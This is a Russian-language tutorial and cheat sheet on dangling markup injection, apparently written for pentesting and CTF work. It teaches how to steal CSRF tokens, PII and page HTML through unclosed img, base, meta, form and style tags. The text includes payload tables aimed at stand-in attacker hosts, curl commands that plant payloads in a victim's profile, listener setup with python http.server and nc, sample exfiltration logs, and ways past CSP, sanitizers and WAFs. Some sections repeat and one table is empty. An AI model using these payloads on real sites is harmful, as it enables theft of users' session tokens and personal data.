Когда HTML-инъекция есть, но JavaScript запрещён (CSP, санитайзер, отсутствие исполняемого контекста), данные всё ещё можно украсть. **Dangling markup injection** — это техника: вы вставляете **незакрытый** тег с атрибутом, указывающим на ваш сервер (например, `<img src='https://attacker/`), и браузер, «дотягивая» тег до следующего символа, отправляет на ваш сервер всё, что оказалось внутри атрибута. Так утекают CSRF-токены, части HTML, email, любые секреты, оказавшиеся в разметке после вашего пейлоада.

## Теория: почему незакрытый тег утекает данные

HTML-парсер очень «терпим» к незакрытым кавычкам. Если вы вставили:

```html
<img src='https://attacker.example/log?
```

и следующий символ в исходной странице — не кавычка, браузер продолжает читать значение `src` **до первой `'`**, которая встретится позже в документе. Всё, что между вашим `?` и этой `'`, уходит в URL картинки → запрос на `attacker.example` → утечка.

То есть атакующий не читает ответ сам; он заставляет **браузер жертвы** отправить данные на свой сервер. Это server-side-visible утечка, работающая даже при строгом CSP (`img-src` часто шире, чем `script-src`).

## Теория: варианты payload

| Пейлоад | Что «поглощает» | Замечание |
|---------|-----------------|-----------|
| `<img src='https://attacker/?` | всё до следующего `'` | классика |
| `<img src=https://attacker/?` | всё до пробела/`>` | если кавычек нет |
| `<a href='https://attacker/?` | ссылки вокруг | |
| `<meta http-equiv=refresh content='0;url=https://attacker/?` | | сработает в `<head>` |
| `<form action='https://attacker/'>` | | при авто-сабмите |
| `<base href='https://attacker/'>` | все относительные URL страницы | угон ресурсов |
| `<style>@import 'https://attacker/?` | | утечка через CSS (см. `web-css-injection`) |

Комбинируйте с **`<base>`**: `<base href='https://attacker/'>` перепишет все относительные ссылки, и жертва отправит запросы (в т.ч. с токенами в URL) на ваш хост.

## Теория: что именно утекает

- **CSRF-токены**, лежащие в `<input type=hidden value="...">` сразу после инъекции.
- **Часть HTML**, если он содержит секреты (например, JSON внутри `<script>`).
- **URL/пути**, если дальше есть ссылки.
- **Email/имя пользователя**, отображаемые рядом.

Даже 30–40 символов утечки могут дать токен. Техника особенно ценна, когда есть **HTML-инъекция, но нет исполнения JS** (см. `web-csp-advanced`, `web-mxss`).

## Инструменты и команды

Проверить, отражается ли HTML без экранирования:

```bash
curl -s 'https://target.local/?q=<img src=x>' | grep -o '<img src=x>'
```

Развернуть приёмник для наблюдения утечки (свой сервер):

```bash
# простой слушатель на своей машине
python3 -m http.server 8000
# пейлоад: <img src='http://ATTACKER_IP:8000/?leak=
```

Отправьте пейлоад в поле и следите за логами `http.server`: в запросе будет всё, что «съел» тег.

## Разобранный пример: кража CSRF-токена

Шаг 1. Находим форму со скрытым токеном:

```bash
curl -s https://target.local/profile -b 'session=victim' | grep -o 'name="csrf" value="[^"]*"'
```

Шаг 2. Ищем HTML-инъекцию **выше** токена (например, в поле имени, которое рендерится над формой). Вставляем:

```
<img src='http://ATTACKER_IP:8000/?leak=
```

Шаг 3. Жертва открывает страницу. Браузер парсит ваш `<img>`, доходит до следующего `'` — а им закрывается `value="..."` токена — и отправляет запрос на ваш сервер с токеном в query.

Шаг 4. В логах видим `GET /?leak=...csrf_token...`. Утечка подтверждена. В отчёте: точный пейлоад, позиция инъекции и полученный токен (в CTF — флаг).

## Разобранный пример: `<base>` для угона всех ссылок

```
<base href='https://attacker.example/'>
```

Все относительные URL (`<a href="/logout">`, `<form action="/x">`) будут резолвиться относительно вашего домена. Клик жертвы по такой ссылке уводит её на ваш сервер (или отправляет данные формы). Это часто «добивает» сценарий с HTML-инъекцией без JS.

## Частые ошибки

- **Искать только «настоящий» XSS.** Dangling markup — это утечка, а не исполнение; не отбрасывайте HTML-инъекцию как «неопасную».
- **Забывать про кавычки.** Пейлоад должен начинать атрибут так, чтобы «съесть» нужный фрагмент; подбирайте `'` vs `"`.
- **Игнорировать CSP.** `img-src`/`style-src` обычно разрешают ваш хост — это и есть обход.
- **Не поднимать приёмник.** Без слушателя вы не увидите утечку; `python3 -m http.server` достаточно.
- **Считать `<base>` безобидным.** Он перенаправляет всю относительную навигацию.

## Полная таблица payload'ов dangling markup

Dangling markup оставляет незакрытый тег, который «поглощает» последующий HTML и отправляет его наружу.

| Payload | Куда уходит | Что ворует |
|---------|-------------|-----------|
| `<img src='//attacker?` | src | до следующей кавычки |
| `<a href="//attacker?` | href | до следующей кавычки |
| `<form action="//attacker?` | action | содержимое формы |
| `<base href="//attacker/">` | все относительные URL | угон ссылок |
| `<meta http-equiv="refresh" content="0;url=//attacker?` | refresh | часть HTML |
| `<link rel=stylesheet href="//attacker?` | stylesheet | до кавычки |
| `<table background="//attacker?` | background | до кавычки |
| `<textarea>` | текст | всё до `</textarea>` |

```bash
# проверяем отражение незакрытого тега
curl -s 'https://app.example/?q=<img src="//attacker.example/leak?'
# в ответе ищем <img src="//attacker...   (тег не закрыт санитайзером)
```

## Что именно утекает

Dangling markup ценен тем, что утекает **HTML вокруг** инъекции, а не JS-данные.

```text
- CSRF-токен в скрытом поле формы (после инъекции)
- session/access-токен в атрибуте/тексте
- PII в таблице/профиле
- другой CSRF-токен для цепочки
```

```html
<!-- пример: инъекция перед формой с токеном -->
<img src='//attacker/steal?
<input type="hidden" name="csrf" value="8f3a...">
' />
<!-- браузер отправит: //attacker/steal?<input ... value="8f3a...">
-->
```

## `<base>` — угон всех относительных ссылок

```html
<base href="https://attacker.example/">
```

После этого все относительные ссылки/формы на странице ведут на attacker — перехват навигации и данных формы. Проверяйте, фильтруется ли `<base>` (часто нет).

## Разобранный пример: кража CSRF-токена

```text
1) находим инъекцию, где сохраняется незакрытый атрибут
2) ставим <img src='//attacker/?
3) после инъекции на странице — форма с CSRF-токеном
4) браузер жертвы делает запрос на attacker, включая токен в URL
5) из логов attacker извлекаем токен
```

```bash
# listener
nc -lvnp 80
# в логе видим:
# GET /?<input type="hidden" name="csrf" value="8f3a...">
```

## Каналы эксфильтрации и обходы

| Проблема | Обход |
|----------|-------|

## Расширенный разбор: когда dangling markup лучше XSS

Dangling markup не выполняет JavaScript, а значит работает там, где CSP запрещает скрипты, а санитайзер всё равно пропускает частично сломанный HTML. Это делает его ценным «запасным» вектором: если XSS заблокирован, а инъекция HTML есть — можно вытащить CSRF-токен или PII. Второе преимущество — утечка идёт автоматически (браузер сам делает запрос), не требуя взаимодействия со скриптом.

```html
<!-- инъекция перед формой: незакрытый src поглотит токен -->
<img src='//attacker/steal?
<input type="hidden" name="csrf" value="SECRET">
'>
<!-- запрос: //attacker/steal?<input ... value="SECRET">
-->
```

Третий сценарий — `<base href="//attacker/">`: одна инъекция перехватывает **все** относительные ссылки и формы страницы, что часто серьёзнее одной утечки токена.

## Итоговая заметка

Dangling markup — надёжный обходной путь, когда XSS недоступен. Он не требует JavaScript, работает при строгом CSP и автоматически утекает данные вокруг инъекции. Проверяйте контекст (тег/атрибут), выбирайте payload по таблице и всегда подтверждайте утечку конкретным токеном, полученным на listener.

## Полный разбор: утечка токена через `<img>` (с выводом)

End-to-end с реальными командами и логами.

Шаг 1. Поднимаем приёмник на своём хосте:

```bash
python3 -m http.server 8000
# Serving HTTP on 0.0.0.0 port 8000 ...
```

Шаг 2. Находим инъекцию выше формы с токеном. Смотрим HTML цели:

```bash
curl -s https://app.example/profile -b 'session=victim' | grep -n 'csrf\|<form\|name='
# 41: <input type="hidden" name="csrf" value="8f3a1b2c9d...">
# 42: <form action="/update" method="post">
```

Шаг 3. Вставляем незакрытый `<img>` в поле, которое рендерится выше токена:

```bash
curl -s -X POST https://app.example/profile \
  --data-urlencode "display_name=<img src='http://ATTACKER_IP:8000/?leak=" \
  -b 'session=victim'
```

Шаг 4. Жертва открывает страницу профиля. Браузер парсит `<img src='http://ATTACKER_IP:8000/?leak=` и «дотягивает» значение `src` до следующей кавычки — а ею закрывается `value="..."` токена:

```html
<input type="hidden" name="csrf" value="8f3a1b2c9d...">
```

Шаг 5. В логе приёмника видим запрос с токеном:

```
127.0.0.1 - - [..] "GET /?leak=%3Cinput%20type%3D%22hidden%22%20name%3D%22csrf%22%20value%3D%228f3a1b2c9d... HTTP/1.1" 404 -
```

URL-декодируем `leak` → получаем токен. Утечка подтверждена. В отчёте — payload, позиция инъекции и полученный токен (в CTF — флаг).

## Reference-таблица: payload'ы и контексты

| Payload | Атрибут/тег | Когда применять |
|---------|-------------|-----------------|
| `<img src='//attacker/?` | `src` | классика, работает везде, где HTML |
| `<img src=//attacker/?` | `src` (без кавычек) | если контекст без кавычек |
| `<a href='//attacker/?` | `href` | когда рядом ссылки |
| `<form action='//attacker/?` | `action` | утечка через сабмит формы |
| `<base href='//attacker/'>` | все относительные URL | угон навигации/форм |
| `<meta http-equiv=refresh content='0;url=//attacker/?` | refresh | инъекция в `<head>` |
| `<link rel=stylesheet href='//attacker/?` | stylesheet | утечка через CSS |
| `<table background='//attacker/?` | `background` | старые движки |
| `<textarea>` | текст | поглощает всё до `</textarea>` |
| `<title>` | текст | поглощает до `</title>` |
| `<style>@import '//attacker/?` | CSS import | утечка через CSS |

Выбор зависит от контекста: в каком теге/атрибуте оказался ваш ввод и какой символ «закроет» поглощение.

## Обход санитайзеров и CSP

- **Кавычка раньше:** если до цели встречается `'`, используйте `"` (и наоборот) или `<textarea>`/`<title>` (поглощают до закрывающего тега).
- **Санитайзер «дозакрывает» теги:** ищите контекст, где тег остаётся открытым (например, в атрибуте или внутри комментария).
- **CSP `img-src 'none'`:** переключитесь на `<base>`, `<meta refresh>`, `<link rel=stylesheet>`, `<style>@import` — какой канал разрешён, тот и используйте. Проверьте заголовок:

```bash
curl -sI https://app.example/ | grep -i content-security-policy
# script-src 'self'; img-src 'self' cdn.example; style-src 'self'
# -> img-src ограничен; попробуйте style/base каналы
```

- **`<base>` фильтруется:** используйте `<meta refresh>` или `<form action>`.
- **WAF по `<img`:** альтернативные теги/регистр/разбиение.
- **Только частичный контроль атрибута:** вставляйте payload, который «съест» нужный фрагмент именно в этом атрибуте.

## Что делать дальше / решение

1. **Найти HTML-инъекцию** (даже «незначительную») и определить контекст (тег/атрибут).
2. **Проверить сохранение незакрытого тега** в ответе.
3. **Выбрать payload** из таблицы под контекст.
4. **Найти цель рядом** (CSRF-токен, сессия, PII, JSON).
5. **Поднять listener** (`python3 -m http.server`/`nc`) и собрать утёкшие данные.
6. **Подтвердить** конкретным токеном (не «должно работать», а реальный запрос в логе).
7. **Оформить PoC**: payload + позиция + полученный токен.
